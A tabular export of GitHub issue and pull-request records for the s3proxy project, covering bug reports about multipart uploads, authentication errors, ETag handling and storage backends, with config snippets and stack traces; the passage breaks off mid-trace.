gaul,s3proxy,https://api.github.com/repos/gaul/s3proxy/issues/108,123036275,MDU6SXNzdWUxMjMwMzYyNzU=,108,Multipart upload not atomic,1772540,closed,FALSE,NA,NA,0,2015-12-18T22:23:11Z,2016-01-15T23:08:28Z,2016-01-15T23:08:28Z,COLLABORATOR,NA,"MPU starts by writing a stub object with the same name as the mpu key name, which overwrites the original object (if it existed) even if complete multipart upload is never submitted.
",NA,FALSE,https://api.github.com/repos/gaul/s3proxy,https://api.github.com/repos/gaul/s3proxy/issues/108/labels{/name},https://api.github.com/repos/gaul/s3proxy/issues/108/comments,https://api.github.com/repos/gaul/s3proxy/issues/108/events,https://github.com/gaul/s3proxy/issues/108,NA
gaul,s3proxy,https://api.github.com/repos/gaul/s3proxy/issues/107,121830408,MDU6SXNzdWUxMjE4MzA0MDg=,107,Cannot run a specific test class or method,848247,closed,FALSE,NA,NA,3,2015-12-12T03:23:07Z,2016-01-06T05:05:23Z,2016-01-06T05:05:23Z,OWNER,NA,"Using both JUnit and testng prevents running a single test, e.g., `mvn test 
-Dtest=S3ProxyTest#testHttpClient`.
",NA,FALSE,https://api.github.com/repos/gaul/s3proxy,https://api.github.com/repos/gaul/s3proxy/issues/107/labels{/name},https://api.github.com/repos/gaul/s3proxy/issues/107/comments,https://api.github.com/repos/gaul/s3proxy/issues/107/events,https://github.com/gaul/s3proxy/issues/107,NA
gaul,s3proxy,https://api.github.com/repos/gaul/s3proxy/issues/106,121728366,MDExOlB1bGxSZXF1ZXN0NTM0MDUwNTk=,106,initial support for encoding-type,884727,closed,FALSE,NA,NA,13,2015-12-11T15:23:47Z,2017-07-13T00:10:23Z,2015-12-15T01:13:10Z,NONE,NA,"This should enable support. I think I caught all the places blobName is put into xml data.

Take a look!
",NA,TRUE,https://api.github.com/repos/gaul/s3proxy,https://api.github.com/repos/gaul/s3proxy/issues/106/labels{/name},https://api.github.com/repos/gaul/s3proxy/issues/106/comments,https://api.github.com/repos/gaul/s3proxy/issues/106/events,https://github.com/gaul/s3proxy/pull/106,https://api.github.com/repos/gaul/s3proxy/pulls/106
gaul,s3proxy,https://api.github.com/repos/gaul/s3proxy/issues/105,121359233,MDU6SXNzdWUxMjEzNTkyMzM=,105,Forbidden InvalidAccessKeyId errors with 1.4.0,83061,closed,FALSE,NA,NA,3,2015-12-09T22:49:40Z,2016-11-16T18:52:28Z,2016-11-16T18:52:28Z,NONE,NA,"I have a simple s3proxy setup I'm using for testing. On upgrading from 1.3.0 to 1.4.0, now I'm getting Forbidden InvalidAccessKeyId when I try to create a bucket via boto using s3 connection.

I can't find anything that solves this in the wiki, source, or documentation of s3proxy or jcloud. Can someone tell me what I'm doing wrong? 

Here is my s3proxy config:

```
s3proxy.authorization=none
s3proxy.endpoint=http://0.0.0.0:9999
jclouds.provider=filesystem
jclouds.identity=identity
jclouds.credential=credential
jclouds.filesystem.basedir=/app/files
```

Here is the code I'm using to create buckets:

``` python
from boto.s3.connection import S3Connection, OrdinaryCallingFormat

if __name__ == '__main__':
    conn = S3Connection(aws_access_key_id='identity', aws_secret_access_key='credential',
                        calling_format=OrdinaryCallingFormat(),
                        is_secure=False, host='localhost', port=9999)

    conn.create_bucket('test')
    print conn.get_all_buckets()
```

And here is the error:

```
$ python create_buckets.py
Traceback (most recent call last):
  File ""create_buckets.py"", line 8, in <module>
    conn.create_bucket('test')
  File ""/usr/local/lib/python2.7/site-packages/boto/s3/connection.py"", line 621, in create_bucket
    response.status, response.reason, body)
boto.exception.S3ResponseError: S3ResponseError: 403 Forbidden
<?xml version=""1.0"" ?><Error><Code>InvalidAccessKeyId</Code><Message>Forbidden</Message><RequestId>4442587FB7D0A2F9</RequestId></Error>
```
",NA,FALSE,https://api.github.com/repos/gaul/s3proxy,https://api.github.com/repos/gaul/s3proxy/issues/105/labels{/name},https://api.github.com/repos/gaul/s3proxy/issues/105/comments,https://api.github.com/repos/gaul/s3proxy/issues/105/events,https://github.com/gaul/s3proxy/issues/105,NA
gaul,s3proxy,https://api.github.com/repos/gaul/s3proxy/issues/104,121292399,MDU6SXNzdWUxMjEyOTIzOTk=,104,encoding-type not supported,884727,closed,FALSE,NA,NA,3,2015-12-09T17:01:32Z,2015-12-15T01:12:39Z,2015-12-15T01:12:39Z,NONE,NA,"Newer versions of the aws cli are including an encoding-type url parameter. I solved this temporarily by backing off to awscli version 1.9.9 using pip. Anything later than that creates issues with s3proxy.

s3proxy throws this:

`A server error (NotImplemented) occurred when calling the ListObjects operation: A header you provided implies functionality that is not implemented.`

Obviously I could add it to the supported parameters list to make the problem go away. But probably not the best option if it's supposed to actually accomplish something.
",NA,FALSE,https://api.github.com/repos/gaul/s3proxy,https://api.github.com/repos/gaul/s3proxy/issues/104/labels{/name},https://api.github.com/repos/gaul/s3proxy/issues/104/comments,https://api.github.com/repos/gaul/s3proxy/issues/104/events,https://github.com/gaul/s3proxy/issues/104,NA
gaul,s3proxy,https://api.github.com/repos/gaul/s3proxy/issues/103,120977073,MDU6SXNzdWUxMjA5NzcwNzM=,103,Provide a docker image for S3Proxy so users can run it anywhere,1856066,closed,FALSE,NA,NA,1,2015-12-08T10:18:39Z,2015-12-10T23:32:51Z,2015-12-10T23:31:51Z,CONTRIBUTOR,NA,"I have implemented something [here](https://github.com/ritazh/s3proxydocker). I'm open to suggestions and feedback to make it better. Would be great if we could add a reference of it to the README of S3Proxy as another option to run S3Proxy.
",NA,FALSE,https://api.github.com/repos/gaul/s3proxy,https://api.github.com/repos/gaul/s3proxy/issues/103/labels{/name},https://api.github.com/repos/gaul/s3proxy/issues/103/comments,https://api.github.com/repos/gaul/s3proxy/issues/103/events,https://github.com/gaul/s3proxy/issues/103,NA
gaul,s3proxy,https://api.github.com/repos/gaul/s3proxy/issues/102,120917174,MDExOlB1bGxSZXF1ZXN0NTI5MzE0MzU=,102,"For Azure backend, map Content-MD5 to  ETag for PUT blob",1856066,closed,FALSE,NA,NA,2,2015-12-08T02:38:17Z,2016-01-04T18:37:21Z,2016-01-04T18:37:21Z,CONTRIBUTOR,NA,"This fixes issue #96 
",NA,TRUE,https://api.github.com/repos/gaul/s3proxy,https://api.github.com/repos/gaul/s3proxy/issues/102/labels{/name},https://api.github.com/repos/gaul/s3proxy/issues/102/comments,https://api.github.com/repos/gaul/s3proxy/issues/102/events,https://github.com/gaul/s3proxy/pull/102,https://api.github.com/repos/gaul/s3proxy/pulls/102
gaul,s3proxy,https://api.github.com/repos/gaul/s3proxy/issues/101,119846499,MDExOlB1bGxSZXF1ZXN0NTIzNDE2ODE=,101,fix(S3AwsSdkTest) - update testBigMultipartUpload,1856066,closed,FALSE,NA,NA,1,2015-12-02T01:24:50Z,2015-12-03T08:43:02Z,2015-12-03T08:43:02Z,CONTRIBUTOR,NA,"Test multipart upload when upload blob size is greater than partSize, resulting in multiple UploadPartRequests.

This test emulate the same behavior as #100 

NOTE: This test currently fails.

```
Results :
Failed tests: 
  S3AwsSdkTest.testBigMultipartUpload:275 
InputStreams do not have equal content
```
",NA,TRUE,https://api.github.com/repos/gaul/s3proxy,https://api.github.com/repos/gaul/s3proxy/issues/101/labels{/name},https://api.github.com/repos/gaul/s3proxy/issues/101/comments,https://api.github.com/repos/gaul/s3proxy/issues/101/events,https://github.com/gaul/s3proxy/pull/101,https://api.github.com/repos/gaul/s3proxy/pulls/101
gaul,s3proxy,https://api.github.com/repos/gaul/s3proxy/issues/100,119845768,MDU6SXNzdWUxMTk4NDU3Njg=,100,Multipart upload fails when multiple UploadPartRequests are needed,1856066,closed,FALSE,NA,NA,2,2015-12-02T01:19:26Z,2015-12-03T00:38:46Z,2015-12-03T00:38:46Z,CONTRIBUTOR,NA,"With multiple UploadPartRequest, only the first UploadPartRequest actually works. All subsequent UploadPartRequests are processed but blob is not actually uploaded. It's possible that I may have missed something.

My test is with a file of size 17MB, part size of 10MB. The expected behavior should be after CompleteMultipartUploadRequest, the entire 17MB file should be uploaded. The actual is a blob of size a little less than 10MB was uploaded as a result from the first UploadPartRequest. Yet a new ETag was returned for both UploadPartResult. From S3Proxy log, seems both requests for partnumber 1 and 2 have been processed properly.

Here is an updated testBigMultipartUpload PR #101 that tests the same behavior. Note the test currently fails.

Log for your reference: [Full Log here](https://gist.github.com/ritazh/bc29fead323e3a527e61)
After the first PUT request, we see binaries in the log:

```
request: (PUT /MyObjectKeyslack?uploadId=t1ZKU.ywRVW7J0ce5asSJN0ZbaiqfLE_A0ovM7gsPEmNtu87bhvdK255Gfw43aTnnUd9lspldyvKbu0u4FX7lPVcE351yGgF5_4OE6gzi.s-&partNumber=1)@265700430 org.eclipse.jetty.server.Request@fd6444e
```

After the second PUT request, no binaries seem to be uploaded in the log.

```
request: (PUT /MyObjectKeyslack?uploadId=t1ZKU.ywRVW7J0ce5asSJN0ZbaiqfLE_A0ovM7gsPEmNtu87bhvdK255Gfw43aTnnUd9lspldyvKbu0u4FX7lPVcE351yGgF5_4OE6gzi.s-&partNumber=2)@265700430 org.eclipse.jetty.server.Request@fd6444e
```
",NA,FALSE,https://api.github.com/repos/gaul/s3proxy,https://api.github.com/repos/gaul/s3proxy/issues/100/labels{/name},https://api.github.com/repos/gaul/s3proxy/issues/100/comments,https://api.github.com/repos/gaul/s3proxy/issues/100/events,https://github.com/gaul/s3proxy/issues/100,NA
gaul,s3proxy,https://api.github.com/repos/gaul/s3proxy/issues/99,119662842,MDU6SXNzdWUxMTk2NjI4NDI=,99,Multipart upload fails with part-number-marker not implemented,1856066,closed,FALSE,NA,NA,4,2015-12-01T07:59:27Z,2016-01-04T23:03:52Z,2016-01-04T23:03:52Z,CONTRIBUTOR,NA,"I'm testing POST upload when file size is ~17MB. This triggers `handleInitiateMultipartUpload`, which returns `InitiateMultipartUploadResult` with `UploadId`. Then a new GET request is called with `part-number-marker=0`, which returns this error: ""Unknown parameters part-number-marker"". I noticed that jclouds `uploadMultipartPart` does not take in `part-number-marker`. Should this be added to S3Proxy or jclouds?

This is the client side code:

```
TransferManager tm = new TransferManager(s3);     
Upload upload = tm.upload(bucketName, key, new File(filePath));
```
",NA,FALSE,https://api.github.com/repos/gaul/s3proxy,https://api.github.com/repos/gaul/s3proxy/issues/99/labels{/name},https://api.github.com/repos/gaul/s3proxy/issues/99/comments,https://api.github.com/repos/gaul/s3proxy/issues/99/events,https://github.com/gaul/s3proxy/issues/99,NA
gaul,s3proxy,https://api.github.com/repos/gaul/s3proxy/issues/98,118105521,MDU6SXNzdWUxMTgxMDU1MjE=,98,Support Backblaze B2,11100,closed,FALSE,NA,NA,5,2015-11-20T19:04:01Z,2016-06-25T00:50:31Z,2016-06-25T00:50:02Z,NONE,NA,"Docs are [here](https://www.backblaze.com/b2/docs/).
",NA,FALSE,https://api.github.com/repos/gaul/s3proxy,https://api.github.com/repos/gaul/s3proxy/issues/98/labels{/name},https://api.github.com/repos/gaul/s3proxy/issues/98/comments,https://api.github.com/repos/gaul/s3proxy/issues/98/events,https://github.com/gaul/s3proxy/issues/98,NA
gaul,s3proxy,https://api.github.com/repos/gaul/s3proxy/issues/97,117952862,MDExOlB1bGxSZXF1ZXN0NTEzMTA3ODA=,97,Add support for conditional get,848247,closed,FALSE,NA,NA,0,2015-11-20T02:31:44Z,2015-11-20T02:39:30Z,2015-11-20T02:39:21Z,OWNER,NA,"Fixes #77.
",NA,TRUE,https://api.github.com/repos/gaul/s3proxy,https://api.github.com/repos/gaul/s3proxy/issues/97/labels{/name},https://api.github.com/repos/gaul/s3proxy/issues/97/comments,https://api.github.com/repos/gaul/s3proxy/issues/97/events,https://github.com/gaul/s3proxy/pull/97,https://api.github.com/repos/gaul/s3proxy/pulls/97
gaul,s3proxy,https://api.github.com/repos/gaul/s3proxy/issues/96,117695050,MDU6SXNzdWUxMTc2OTUwNTA=,96,AWS SDK upload fails with Azure backend,1856066,closed,FALSE,NA,NA,21,2015-11-18T22:19:18Z,2016-10-24T22:30:51Z,2016-10-24T22:30:51Z,CONTRIBUTOR,NA,"Using this sample code here:
https://github.com/aws/aws-sdk-java/blob/master/src/samples/AmazonS3/S3Sample.java#L119

Error:
at com.amazonaws.services.s3.AmazonS3Client.putObject(AmazonS3Client.java:1398): Input is expected to be encoded in multiple of 2 bytes but found: 17

File was uploaded successfully, but ends in exception.

Same test runs successfully against AWS S3.

I see this PR added etag support for AzureBlob. https://github.com/jclouds/jclouds/pull/716/files
",NA,FALSE,https://api.github.com/repos/gaul/s3proxy,https://api.github.com/repos/gaul/s3proxy/issues/96/labels{/name},https://api.github.com/repos/gaul/s3proxy/issues/96/comments,https://api.github.com/repos/gaul/s3proxy/issues/96/events,https://github.com/gaul/s3proxy/issues/96,NA
gaul,s3proxy,https://api.github.com/repos/gaul/s3proxy/issues/95,117263977,MDExOlB1bGxSZXF1ZXN0NTA4OTUwODQ=,95,fix(S3ProxyHandler) - Anonymous access mode should return all buckets…,1856066,closed,FALSE,NA,NA,1,2015-11-17T02:04:05Z,2015-11-17T05:21:57Z,2015-11-17T05:21:57Z,CONTRIBUTOR,NA,"Tested against S3 and Azure Blob Storage
Closes #94 
",NA,TRUE,https://api.github.com/repos/gaul/s3proxy,https://api.github.com/repos/gaul/s3proxy/issues/95/labels{/name},https://api.github.com/repos/gaul/s3proxy/issues/95/comments,https://api.github.com/repos/gaul/s3proxy/issues/95/events,https://github.com/gaul/s3proxy/pull/95,https://api.github.com/repos/gaul/s3proxy/pulls/95
gaul,s3proxy,https://api.github.com/repos/gaul/s3proxy/issues/94,117224199,MDU6SXNzdWUxMTcyMjQxOTk=,94,Anonymous access mode cannot list a private access bucket,848247,closed,FALSE,NA,NA,5,2015-11-16T21:39:48Z,2015-11-17T05:21:44Z,2015-11-17T05:21:44Z,OWNER,NA,"Anonymous access configuration should skip `doHandleAnonymous` handling which only allows access to public-read buckets and keys.  Discovered by @ritazh and @sedouard.
",NA,FALSE,https://api.github.com/repos/gaul/s3proxy,https://api.github.com/repos/gaul/s3proxy/issues/94/labels{/name},https://api.github.com/repos/gaul/s3proxy/issues/94/comments,https://api.github.com/repos/gaul/s3proxy/issues/94/events,https://github.com/gaul/s3proxy/issues/94,NA
gaul,s3proxy,https://api.github.com/repos/gaul/s3proxy/issues/93,117142109,MDU6SXNzdWUxMTcxNDIxMDk=,93,Re-factoring question for s3proxy portability,884727,closed,FALSE,NA,NA,12,2015-11-16T14:55:52Z,2016-01-25T23:06:03Z,2016-01-25T23:06:03Z,NONE,NA,"Our requirements are a bit different. We have to effectively re-write the incoming url to a different outgoing url for use with s3proxy (and swift on our backend).

I accomplished this by writing a HandlerWrapper that makes necessary changes and forwards those requests using setRequestURI (which seems to have disappeared in newer versions of jetty. that's another issue) onto S3ProxyHandler. This ""works"".

The intent was to write a wrapper that could do the job while modifying the underlying code as little as possible. Unfortunately I find myself having to pull functionality from inside the underlying S3ProxyHandler and put it in my wrapper. Things like support for virtual host style buckets and authentication need to happen in this wrapper layer. And, in fact, when they happen in my wrapper layer, they shouldn't happen in the underlying handler. In addition, jetty does not appear to allow you to change many aspects of the request.

What do you think about making s3proxy functionality into something a bit more like a library/utility. Much of the functionality could be abstracted out into helper functions and not directly implemented in S3ProxyHandler. In that way, the provided S3ProxyHandler could be more of a functional default behavior, but if you supply a different handler, you can override behavior easily.

If there is a mailing list or other place to discuss this more appropriate than here, please let me know.

@andrewgaul Thanks for all your help on this! If this is of interest to you, please let me know. I would be happy to setup a time to talk about it in depth.

--Derrek
",NA,FALSE,https://api.github.com/repos/gaul/s3proxy,https://api.github.com/repos/gaul/s3proxy/issues/93/labels{/name},https://api.github.com/repos/gaul/s3proxy/issues/93/comments,https://api.github.com/repos/gaul/s3proxy/issues/93/events,https://github.com/gaul/s3proxy/issues/93,NA
gaul,s3proxy,https://api.github.com/repos/gaul/s3proxy/issues/92,116846682,MDU6SXNzdWUxMTY4NDY2ODI=,92,S3Proxy does not delete Swift MPU parts,848247,closed,FALSE,NA,NA,11,2015-11-13T20:34:24Z,2016-01-27T06:34:38Z,2016-01-27T06:34:38Z,OWNER,NA,"S3Proxy needs to add [?multipart-manifest=delete](http://docs.openstack.org/developer/swift/overview_large_objects.html#deleting-a-large-object) to its Swift remove object call to delete all parts of an MPU.  Need to think about this a bit since we would send this unconditionally for all `removeBlob` calls.

```
$ s3cmd -c .s3cfg-s3proxy put --multipart-chunk-size-mb=5 work/s3proxy/target/s3proxy s3://whatever
asking for bucket location
work/s3proxy/target/s3proxy -> s3://whatever/s3proxy  [part 1 of 2, 5MB]
 5242880 of 5242880   100% in    7s   647.26 kB/s  done
work/s3proxy/target/s3proxy -> s3://whatever/s3proxy  [part 2 of 2, 2MB]
 2508615 of 2508615   100% in    4s   593.93 kB/s  done

$ s3cmd -c .s3cfg-s3proxy ls --recursive s3://whatever
2015-11-13 20:30   7751495   s3://whatever/s3proxy
2015-11-13 20:30   5242880   s3://whatever/s3proxy/slo/1447446602.394000/0/0/00000001
2015-11-13 20:30   2508615   s3://whatever/s3proxy/slo/1447446602.394000/0/0/00000002

$ s3cmd -c .s3cfg-s3proxy rm s3://whatever/s3proxy
File s3://whatever/s3proxy deleted

$ s3cmd -c .s3cfg-s3proxy ls --recursive s3://whatever
2015-11-13 20:30   5242880   s3://whatever/s3proxy/slo/1447446602.394000/0/0/00000001
2015-11-13 20:30   2508615   s3://whatever/s3proxy/slo/1447446602.394000/0/0/00000002
```

Found by @dleute in #91.
",NA,FALSE,https://api.github.com/repos/gaul/s3proxy,https://api.github.com/repos/gaul/s3proxy/issues/92/labels{/name},https://api.github.com/repos/gaul/s3proxy/issues/92/comments,https://api.github.com/repos/gaul/s3proxy/issues/92/events,https://github.com/gaul/s3proxy/issues/92,NA
gaul,s3proxy,https://api.github.com/repos/gaul/s3proxy/issues/91,116810266,MDU6SXNzdWUxMTY4MTAyNjY=,91,multipart upload error with openstack-swift backend,884727,closed,FALSE,NA,NA,8,2015-11-13T17:14:10Z,2015-11-20T00:19:07Z,2015-11-13T20:16:29Z,NONE,NA,"Current master is providing this error for a multipart upload using s3cmd:

ERROR: S3 error: 500 (Multiple entries with same key: 1=MultipartPart{partNumber=1, partSize=5242880, partETag=d2c07cca277ffb5924c4a77d12688bab} and 1=MultipartPart{partNumber=1, partSize=5242880, partETag=d2c07cca277ffb5924c4a77d12688bab}): 

I assume this is because of the partNumber mismatch. Reproducing this:

```
s3cmd put --multipart-chunk-size-mb=5 s3proxy s3://mybucket/whatever/s3proxy
s3cmd del s3://mybucket/whatever/s3proxy
s3cmd put --multipart-chunk-size-mb=5 s3proxy s3://mybucket/whatever/s3proxy
```

The above example seemingly uploads correctly. Then the delete seems to have deleted correctly. Then uploading another multipart upload to the same object id always fails.

Could you give me some feedback about how to debug and correct this? I realize it is likely to be an underlying jclouds issue.

Thanks!

--Derrek
",NA,FALSE,https://api.github.com/repos/gaul/s3proxy,https://api.github.com/repos/gaul/s3proxy/issues/91/labels{/name},https://api.github.com/repos/gaul/s3proxy/issues/91/comments,https://api.github.com/repos/gaul/s3proxy/issues/91/events,https://github.com/gaul/s3proxy/issues/91,NA
gaul,s3proxy,https://api.github.com/repos/gaul/s3proxy/issues/90,116239928,MDU6SXNzdWUxMTYyMzk5Mjg=,90,Allow configuration via command-line,848247,open,FALSE,NA,NA,1,2015-11-11T01:13:52Z,2017-05-06T01:56:51Z,NA,OWNER,NA,"This would simplify many of the examples, especially for the common use case of the filesystem provider with no authentication.
",NA,FALSE,https://api.github.com/repos/gaul/s3proxy,https://api.github.com/repos/gaul/s3proxy/issues/90/labels{/name},https://api.github.com/repos/gaul/s3proxy/issues/90/comments,https://api.github.com/repos/gaul/s3proxy/issues/90/events,https://github.com/gaul/s3proxy/issues/90,NA
gaul,s3proxy,https://api.github.com/repos/gaul/s3proxy/issues/89,113009679,MDU6SXNzdWUxMTMwMDk2Nzk=,89,ACL and http form upload,1567457,closed,FALSE,NA,NA,5,2015-10-23T12:26:36Z,2015-10-24T17:49:10Z,2015-10-24T17:49:10Z,NONE,NA,"I read in the s3proxy documentation that it is possible to 

> set and get canned bucket and object ACLs (private and public-read only).

Where can I find documentation about those ACL ?

I'm using the filesystem providers for testing purposes. I read on jclouds documentation that:

> By default, every item you put into a container is private, if you are interested in giving access to others, you will have to explicitly configure that. Exposing public containers is provider-specific.

The page about [filesystem provider](http://jclouds.apache.org/guides/filesystem/) doesn't mention ACL.

Basically, I'm trying to upload files from an HTML form and download, all directly to s3proxy using the official AWS documentation on [Creating an HTML Form](http://docs.aws.amazon.com/AmazonS3/latest/API/sigv4-HTTPPOSTForms.html).

Whatever I attempt, I always get the following error:

``` xml
<Error>
<Code>AccessDenied</Code>
<Message>
AWS authentication requires a valid Date or x-amz-date header
</Message>
<RequestId>4442587FB7D0A2F9</RequestId>
</Error>
```

Though x-amz-date is (correctly) set, I tried multiple variant of date. So I'm trying to make the bucket public to bypass the authentification issues.
",NA,FALSE,https://api.github.com/repos/gaul/s3proxy,https://api.github.com/repos/gaul/s3proxy/issues/89/labels{/name},https://api.github.com/repos/gaul/s3proxy/issues/89/comments,https://api.github.com/repos/gaul/s3proxy/issues/89/events,https://github.com/gaul/s3proxy/issues/89,NA
gaul,s3proxy,https://api.github.com/repos/gaul/s3proxy/issues/88,112764406,MDU6SXNzdWUxMTI3NjQ0MDY=,88,Multipart cleanup,1567457,closed,FALSE,NA,NA,2,2015-10-22T09:26:55Z,2015-11-04T22:24:57Z,2015-11-04T22:24:57Z,NONE,NA,"I noticed that when I send a file that triggers a multipart upload, after the upload some stuff remains.

For example, I have an empty file called `EXAMPLEJZ6e0YupT2h66iePQCc9IEbYbDUy4RTpMeoSMLPRp8Z5o1u8feSRonpvnWsKKG35t
I2LB9VDPiCgTy.Gq2VxQLYjrue4Nq.NBdqI-7e9ddb3d-b582-4e9f-b099-a824cedc87b4` that lies in the bucket next to the actual uploaded file.

This ""junk file"" is listed by `ls` and can be removed by `rm`

I used `release 1.4.0 jar` and `aws-cli/1.4.2 Python/3.4.2 Linux/3.16.0-4-amd64`
",NA,FALSE,https://api.github.com/repos/gaul/s3proxy,https://api.github.com/repos/gaul/s3proxy/issues/88/labels{/name},https://api.github.com/repos/gaul/s3proxy/issues/88/comments,https://api.github.com/repos/gaul/s3proxy/issues/88/events,https://github.com/gaul/s3proxy/issues/88,NA
gaul,s3proxy,https://api.github.com/repos/gaul/s3proxy/issues/87,112491139,MDExOlB1bGxSZXF1ZXN0NDgyNzc0MTE=,87,Added tests for uploading large parts in multipart upload,3627481,closed,FALSE,NA,NA,1,2015-10-21T01:03:41Z,2015-10-21T05:09:48Z,2015-10-21T05:09:48Z,NONE,NA,"The blobstore method works fine but the Java AWS SDK test fails with the traceback:

```
java.lang.IllegalStateException: Form too large: 10000000 > 200000
    at org.eclipse.jetty.server.Request.extractFormParameters(Request.java:364) ~[jetty-server-9.2.12.v20150709.jar:9.2.12.v20150709]
    at org.eclipse.jetty.server.Request.extractContentParameters(Request.java:302) ~[jetty-server-9.2.12.v20150709.jar:9.2.12.v20150709]
    at org.eclipse.jetty.server.Request.extractParameters(Request.java:256) ~[jetty-server-9.2.12.v20150709.jar:9.2.12.v20150709]
    at org.eclipse.jetty.server.Request.getParameter(Request.java:825) ~[jetty-server-9.2.12.v20150709.jar:9.2.12.v20150709]
    at org.gaul.s3proxy.S3ProxyHandler.createAuthorizationSignature(S3ProxyHandler.java:1924) ~[classes/:na]
    at org.gaul.s3proxy.S3ProxyHandler.doHandle(S3ProxyHandler.java:369) ~[classes/:na]
    at org.gaul.s3proxy.S3ProxyHandler.handle(S3ProxyHandler.java:237) ~[classes/:na]
```

where `10000000` is the size of the part being uploaded. See #80.
",NA,TRUE,https://api.github.com/repos/gaul/s3proxy,https://api.github.com/repos/gaul/s3proxy/issues/87/labels{/name},https://api.github.com/repos/gaul/s3proxy/issues/87/comments,https://api.github.com/repos/gaul/s3proxy/issues/87/events,https://github.com/gaul/s3proxy/pull/87,https://api.github.com/repos/gaul/s3proxy/pulls/87
gaul,s3proxy,https://api.github.com/repos/gaul/s3proxy/issues/86,111750526,MDExOlB1bGxSZXF1ZXN0NDc4NjcwMDQ=,86,Handle listing a public-read container,848247,closed,FALSE,NA,NA,1,2015-10-16T03:16:09Z,2015-10-16T03:20:17Z,2015-10-16T03:20:14Z,OWNER,NA,"Also handle checking existence.
",NA,TRUE,https://api.github.com/repos/gaul/s3proxy,https://api.github.com/repos/gaul/s3proxy/issues/86/labels{/name},https://api.github.com/repos/gaul/s3proxy/issues/86/comments,https://api.github.com/repos/gaul/s3proxy/issues/86/events,https://github.com/gaul/s3proxy/pull/86,https://api.github.com/repos/gaul/s3proxy/pulls/86
gaul,s3proxy,https://api.github.com/repos/gaul/s3proxy/issues/85,111059559,MDExOlB1bGxSZXF1ZXN0NDc0NjY0ODg=,85,handle listing container for anonymous requests,1772540,closed,FALSE,NA,NA,1,2015-10-12T21:28:08Z,2015-10-16T03:20:20Z,2015-10-16T03:20:20Z,COLLABORATOR,NA,,NA,TRUE,https://api.github.com/repos/gaul/s3proxy,https://api.github.com/repos/gaul/s3proxy/issues/85/labels{/name},https://api.github.com/repos/gaul/s3proxy/issues/85/comments,https://api.github.com/repos/gaul/s3proxy/issues/85/events,https://github.com/gaul/s3proxy/pull/85,https://api.github.com/repos/gaul/s3proxy/pulls/85
gaul,s3proxy,https://api.github.com/repos/gaul/s3proxy/issues/84,110873125,MDExOlB1bGxSZXF1ZXN0NDczNzIyNDU=,84,Do not check authorization when in anonymous mode,848247,closed,FALSE,NA,NA,2,2015-10-11T18:09:50Z,2015-10-12T21:48:17Z,2015-10-12T21:47:53Z,OWNER,NA,,NA,TRUE,https://api.github.com/repos/gaul/s3proxy,https://api.github.com/repos/gaul/s3proxy/issues/84/labels{/name},https://api.github.com/repos/gaul/s3proxy/issues/84/comments,https://api.github.com/repos/gaul/s3proxy/issues/84/events,https://github.com/gaul/s3proxy/pull/84,https://api.github.com/repos/gaul/s3proxy/pulls/84
gaul,s3proxy,https://api.github.com/repos/gaul/s3proxy/issues/83,110220777,MDU6SXNzdWUxMTAyMjA3Nzc=,83,s3cmd error because s3proxy does not return etag,884727,closed,FALSE,NA,NA,5,2015-10-07T13:00:54Z,2015-10-09T15:42:05Z,2015-10-09T15:16:57Z,NONE,NA,"It looks like s3proxy doesn't return an etag which makes it difficult to use s3cmd with the proxy. Obviously any other client that uses the etag will also have issues.

This is on a s3cmd get s3://container_0/file.txt based on a swift provider.

I am receiving this error:

```
Problem: KeyError: 'etag'
S3cmd:   1.6.0+
python:   2.7.10 (default, Oct  6 2015, 11:07:59) 
[GCC 4.2.1 Compatible Apple LLVM 7.0.0 (clang-700.0.72)]
environment LANG=en_US.UTF-8

Traceback (most recent call last):
  File ""/opt/local/Library/Frameworks/Python.framework/Versions/2.7/lib/python2.7/site-packages/s3cmd-1.6.0_-py2.7.egg/EGG-INFO/scripts/s3cmd"", line 2813, in <module>
  File ""/opt/local/Library/Frameworks/Python.framework/Versions/2.7/lib/python2.7/site-packages/s3cmd-1.6.0_-py2.7.egg/EGG-INFO/scripts/s3cmd"", line 2721, in main
  File ""/opt/local/Library/Frameworks/Python.framework/Versions/2.7/lib/python2.7/site-packages/s3cmd-1.6.0_-py2.7.egg/EGG-INFO/scripts/s3cmd"", line 549, in cmd_object_get
  File ""build/bdist.macosx-10.11-x86_64/egg/S3/S3.py"", line 636, in object_get
    response = self.recv_file(request, stream, labels, start_position)
  File ""build/bdist.macosx-10.11-x86_64/egg/S3/S3.py"", line 1455, in recv_file
    md5_from_s3 = response[""headers""][""etag""].strip('""')
KeyError: 'etag'
```
",NA,FALSE,https://api.github.com/repos/gaul/s3proxy,https://api.github.com/repos/gaul/s3proxy/issues/83/labels{/name},https://api.github.com/repos/gaul/s3proxy/issues/83/comments,https://api.github.com/repos/gaul/s3proxy/issues/83/events,https://github.com/gaul/s3proxy/issues/83,NA
gaul,s3proxy,https://api.github.com/repos/gaul/s3proxy/issues/82,110049525,MDU6SXNzdWUxMTAwNDk1MjU=,82,not authorized for swift and openstack-swift for softlayer object store backend,884727,closed,FALSE,NA,NA,5,2015-10-06T16:36:54Z,2015-10-09T15:14:59Z,2015-10-09T15:14:59Z,NONE,NA,"I am attempting to connect s3 proxy to a softlayer object storage which should be equivalent to swift 2.2.

Pasted below is the error with the swift provider (removed auth string, replaced with ****)

I am using current master for this exercise. This first error is after successfully putting a file and then trying to get the same exact file.

Any help would be appreciated. Should I revert to a previously tagged release?

```
org.jclouds.rest.AuthorizationException: command: GET https://dal05.objectstorage.softlayer.net/v1/AUTH_****/container_0/ HTTP/1.1 failed with response: HTTP/1.1 401 Unauthorized; content: [<html><h1>Unauthorized</h1><p>This server could not verify that you are authorized to access the document you requested.</p></html>]
    at org.jclouds.openstack.swift.handlers.ParseSwiftErrorFromHttpResponse.handleError(ParseSwiftErrorFromHttpResponse.java:58) ~[s3proxy-original:1.5.0-SNAPSHOT]
    at org.jclouds.http.handlers.DelegatingErrorHandler.handleError(DelegatingErrorHandler.java:65) ~[s3proxy-original:1.5.0-SNAPSHOT]
    at org.jclouds.http.internal.BaseHttpCommandExecutorService.shouldContinue(BaseHttpCommandExecutorService.java:136) ~[s3proxy-original:1.5.0-SNAPSHOT]
    at org.jclouds.http.internal.BaseHttpCommandExecutorService.invoke(BaseHttpCommandExecutorService.java:105) ~[s3proxy-original:1.5.0-SNAPSHOT]
    at org.jclouds.rest.internal.InvokeHttpMethod.invoke(InvokeHttpMethod.java:90) ~[s3proxy-original:1.5.0-SNAPSHOT]
    at org.jclouds.rest.internal.InvokeHttpMethod.apply(InvokeHttpMethod.java:73) ~[s3proxy-original:1.5.0-SNAPSHOT]
